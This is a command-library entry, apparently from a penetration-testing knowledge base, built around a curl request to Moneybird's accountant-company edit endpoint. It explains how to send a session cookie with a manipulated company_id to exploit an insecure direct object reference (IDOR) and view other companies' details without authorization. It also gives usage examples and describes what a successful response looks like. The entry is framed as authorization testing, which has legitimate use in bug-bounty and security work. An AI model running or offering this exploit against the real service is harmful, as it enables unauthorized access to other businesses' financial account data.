---
id: cmd-uuid-1
data: >-
  curl -H "Cookie: session=your_session_cookie"
  https://moneybird.com/user/accountant_company/edit?company_id=TARGET_COMPANY_ID
tags:
  - web
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:29.490Z'
verified: false
validated: true
submitted: true
---
# curl-access-edit-endpoint

## Command

```bash
curl -H "Cookie: session=your_session_cookie" https://moneybird.com/user/accountant_company/edit?company_id=TARGET_COMPANY_ID
```

## Description

This command uses curl to send a GET request to the Moneybird edit endpoint with a manipulated company ID, exploiting IDOR to access unauthorized company details. Use it to test for access without permission checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Cookie: session=..."` | Authentication header with session cookie | Yes |
| `?company_id=TARGET_COMPANY_ID` | Query parameter for the target company ID | Yes |

## Examples

### Basic Usage

```bash
curl -H "Cookie: session=abc123" https://moneybird.com/user/accountant_company/edit?company_id=456
```

### Advanced Usage

```bash
curl -v -H "Cookie: session=abc123" https://moneybird.com/user/accountant_company/edit?company_id=456 -o response.html
```

## Expected Output

HTML response containing the edit form for the company, including fields like company name. Success indicated by 200 OK status without access denied messages.

## Related

- [[Related Procedure|procedures/Access-Moneybird-Accountant-Company-Edit-Endpoint-via-IDOR]]
